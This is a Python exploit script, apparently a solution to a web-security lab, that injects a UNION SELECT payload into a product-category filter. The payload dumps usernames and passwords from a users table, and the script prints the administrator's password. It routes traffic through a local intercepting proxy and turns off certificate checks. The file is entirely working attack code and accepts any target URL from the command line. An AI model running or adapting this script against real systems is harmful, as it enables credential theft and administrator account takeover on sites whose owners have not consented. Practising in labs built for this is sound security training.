import sys
import urllib3
import requests
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_table(url):
    path = "filter?category=Pets"
    payload = "' UNION SELECT NULL, username || '~' || password FROM users--"
    r = requests.get(url + path + payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        soup = BeautifulSoup(res,"html.parser")
        pwd = soup.find(string=re.compile('.*administrator.*')).split("~")[1]
        print("[+] The administrator password is '%s'." % pwd)
        return True
    return False



if __name__ == "__main__":
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    if not exploit_table(url): 
        print("[-] Unlucky")